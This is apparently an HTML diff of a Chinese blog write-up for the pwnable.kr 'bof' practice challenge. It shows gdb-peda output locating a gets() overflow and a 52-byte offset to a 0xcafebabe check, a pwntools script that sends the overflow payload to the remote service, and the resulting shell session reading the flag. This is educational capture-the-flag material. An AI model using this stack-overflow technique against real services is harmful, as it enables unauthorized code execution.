+   0x5655566b <span class="token operator">&lt;</span>+63<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0x565557a3
+   0x56555672 <span class="token operator">&lt;</span>+70<span class="token operator">></span>:    call   0xf7e67140 <span class="token operator">&lt;</span>puts<span class="token operator">></span>
+   0x56555677 <span class="token operator">&lt;</span>+75<span class="token operator">></span>:    mov    eax,DWORD PTR <span class="token punctuation">[</span>ebp-0xc<span class="token punctuation">]</span>
+   0x5655567a <span class="token operator">&lt;</span>+78<span class="token operator">></span>:    xor    eax,DWORD PTR gs:0x14
+   0x56555681 <span class="token operator">&lt;</span>+85<span class="token operator">></span>:    je     0x56555688 <span class="token operator">&lt;</span>func+92<span class="token operator">></span>
+   0x56555683 <span class="token operator">&lt;</span>+87<span class="token operator">></span>:    call   0xf7efd790 <span class="token operator">&lt;</span>__stack_chk_fail<span class="token operator">></span>
+   0x56555688 <span class="token operator">&lt;</span>+92<span class="token operator">></span>:    leave  
+   0x56555689 <span class="token operator">&lt;</span>+93<span class="token operator">></span>:    ret    
+End of assembler dump.
+</code></pre>
+<p>在    0x56555654 &lt;+40&gt;:    cmp    DWORD PTR [ebp+0x8],0xcafebabe 处 下断</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">gdb-peda$ n
+overflow me <span class="token keyword">:</span> 
+AAAAAAAAAA
+
+<span class="token punctuation">[</span>----------------------------------registers-----------------------------------<span class="token punctuation">]</span>
+EAX: 0xffffd04c <span class="token punctuation">(</span><span class="token string">"AAAAAAAAAA"</span><span class="token punctuation">)</span>
+EBX: 0x0 
+ECX: 0xf7fb85a0 --<span class="token operator">></span> 0xfbad2288 
+EDX: 0xf7fb987c --<span class="token operator">></span> 0x0 
+ESI: 0xf7fb8000 --<span class="token operator">></span> 0x1afdb0 
+EDI: 0xf7fb8000 --<span class="token operator">></span> 0x1afdb0 
+EBP: 0xffffd078 --<span class="token operator">></span> 0xffffd098 --<span class="token operator">></span> 0x0 
+ESP: 0xffffd030 --<span class="token operator">></span> 0xffffd04c <span class="token punctuation">(</span><span class="token string">"AAAAAAAAAA"</span><span class="token punctuation">)</span>
+EIP: 0x56555654 <span class="token punctuation">(</span><span class="token operator">&lt;</span>func+40<span class="token operator">></span>:    <span class="token function">cmp</span>    DWORD PTR <span class="token punctuation">[</span>ebp+0x8<span class="token punctuation">]</span>,0xcafebabe<span class="token punctuation">)</span>
+EFLAGS: 0x246 <span class="token punctuation">(</span>carry PARITY adjust ZERO sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>
+   0x56555649 <span class="token operator">&lt;</span>func+29<span class="token operator">></span>:    lea    eax,<span class="token punctuation">[</span>ebp-0x2c<span class="token punctuation">]</span>
+   0x5655564c <span class="token operator">&lt;</span>func+32<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,eax
+   0x5655564f <span class="token operator">&lt;</span>func+35<span class="token operator">></span>:    call   0xf7e66890 <span class="token operator">&lt;</span>gets<span class="token operator">></span>
+<span class="token operator">=</span><span class="token operator">></span> 0x56555654 <span class="token operator">&lt;</span>func+40<span class="token operator">></span>:    <span class="token function">cmp</span>    DWORD PTR <span class="token punctuation">[</span>ebp+0x8<span class="token punctuation">]</span>,0xcafebabe
+   0x5655565b <span class="token operator">&lt;</span>func+47<span class="token operator">></span>:    jne    0x5655566b <span class="token operator">&lt;</span>func+63<span class="token operator">></span>
+   0x5655565d <span class="token operator">&lt;</span>func+49<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0x5655579b
+   0x56555664 <span class="token operator">&lt;</span>func+56<span class="token operator">></span>:    call   0xf7e42940 <span class="token operator">&lt;</span>system<span class="token operator">></span>
+   0x56555669 <span class="token operator">&lt;</span>func+61<span class="token operator">></span>:    jmp    0x56555677 <span class="token operator">&lt;</span>func+75<span class="token operator">></span>
+<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>
+0000<span class="token operator">|</span> 0xffffd030 --<span class="token operator">></span> 0xffffd04c <span class="token punctuation">(</span><span class="token string">"AAAAAAAAAA"</span><span class="token punctuation">)</span>
+0004<span class="token operator">|</span> 0xffffd034 --<span class="token operator">></span> 0xffffd0d4 --<span class="token operator">></span> 0xd28e2a50 
+0008<span class="token operator">|</span> 0xffffd038 --<span class="token operator">></span> 0xf7fb8000 --<span class="token operator">></span> 0x1afdb0 
+0012<span class="token operator">|</span> 0xffffd03c --<span class="token operator">></span> 0xd267 
+0016<span class="token operator">|</span> 0xffffd040 --<span class="token operator">></span> 0xffffffff 
+0020<span class="token operator">|</span> 0xffffd044 --<span class="token operator">></span> 0x2f <span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+0024<span class="token operator">|</span> 0xffffd048 --<span class="token operator">></span> 0xf7e14dc8 --<span class="token operator">></span> 0x2b76 <span class="token punctuation">(</span><span class="token string">'v+'</span><span class="token punctuation">)</span>
+0028<span class="token operator">|</span> 0xffffd04c <span class="token punctuation">(</span><span class="token string">"AAAAAAAAAA"</span><span class="token punctuation">)</span>
+<span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>
+Legend: code, data, rodata, value
+
+Breakpoint 2, 0x56555654 <span class="token keyword">in</span> func <span class="token punctuation">(</span><span class="token punctuation">)</span>
+`
+</code></pre>
 <p>AAAAAAAAAA 的指针位于堆栈的顶部，它指向地址ESP: 0xffffd030 –&gt; 0xffffd04c (“AAAAAAAAAA”)</p>
 <p>所以可以计算偏移量<br>gdb-peda$ p/d 0xffffd080 - 0xffffd04c<br>$1 = 52</p>
-<p>有了偏移量 就可以写payload了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="comment">#p = process('./bof')</span></div><div class="line">p = remote(<span class="string">'pwnable.kr'</span>,<span class="number">9000</span>)</div><div class="line">payload = <span class="string">'A'</span>*<span class="number">52</span> + <span class="string">'\xbe\xba\xfe\xca'</span></div><div class="line">p.send(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
-<p>运行结果…<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">ios@ubuntu:~$ python bof.py</div><div class="line">[+] Opening connection to pwnable.kr on port 9000: Done</div><div class="line">[*] Switching to interactive mode</div><div class="line">$ ls</div><div class="line">bof</div><div class="line">bof.c</div><div class="line">flag</div><div class="line"><span class="built_in">log</span></div><div class="line"><span class="built_in">log</span>2</div><div class="line">super.pl</div><div class="line">$ cat flag</div><div class="line">daddy, I just pwned a buFFer :)</div></pre></td></tr></table></figure></p>
+<p>有了偏移量 就可以写payload了</p>
+<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token comment" spellcheck="true">#p = process('./bof')</span>
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span><span class="token number">9000</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">52</span> <span class="token operator">+</span> <span class="token string">'\xbe\xba\xfe\xca'</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<p>运行结果…</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ python bof.py
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Opening connection to pwnable.kr on port 9000: Done
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode
+$ <span class="token function">ls</span>
+bof
+bof.c
+flag
+log
+log2
+super.pl
+$ <span class="token function">cat</span> flag
+daddy, I just pwned a buFFer :<span class="token punctuation">)</span>
+</code></pre>
 
     
 
